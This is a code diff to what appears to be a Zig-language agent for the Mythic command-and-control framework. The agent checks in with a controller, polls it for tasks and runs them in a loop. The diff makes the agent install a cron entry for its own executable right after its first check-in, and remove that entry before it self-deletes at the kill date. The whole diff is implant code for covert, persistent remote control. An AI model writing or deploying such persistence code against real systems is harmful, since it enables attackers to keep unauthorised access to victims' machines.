@@ -21,6 +21,7 @@ const NetworkClient = network.NetworkClient;
 const SystemInfo = utils.SystemInfo;
 const CryptoUtils = utils.CryptoUtils;
 const TimeUtils = utils.TimeUtils;
+const PersistUtils = utils.PersistUtils;
 
 pub const MythicAgent = struct {
     const Self = @This();
@@ -77,13 +78,24 @@ pub const MythicAgent = struct {
         self.is_running = true;
         
         try self.checkin();
+        // Install persistence after first check-in
+        const exepath = try std.fs.selfExePathAlloc(self.allocator);
+        defer self.allocator.free(exepath);
+
+        PersistUtils.install_cron(exepath, self.allocator) catch |err| {
+        std.debug.print("{}", .{err});
+        };
         
         while (self.is_running) {
             if (self.config.kill_date) |kill_date| {
                 if (TimeUtils.isKillDateReached(kill_date)) {
-                    //we'll try to make the binary self delete
+                    //we'll try to make the binary remove persistence and self delete
                     const exe_path = try std.fs.selfExePathAlloc(self.allocator);
                     defer self.allocator.free(exe_path);
+
+                    PersistUtils.remove_cron_entry(exe_path, self.allocator) catch |err| {
+                        print("{}", .{err});
+                    };
 
                     std.fs.deleteFileAbsolute(exe_path) catch |err| {
                         print("{}", .{err});
@@ -91,20 +103,20 @@ pub const MythicAgent = struct {
                     std.posix.exit(0);
                 }
             }
-            
+
             self.getTasks() catch |err| {
                 print("{}", .{err});
             };
-            
+
             try self.processTasks();
-            
+
             self.sendResponses() catch |err| {
                 print("{}", .{err});
             };
-            
+
             self.sleep();
         }
-        
+
     }
     
     fn checkin(self: *Self) !void {
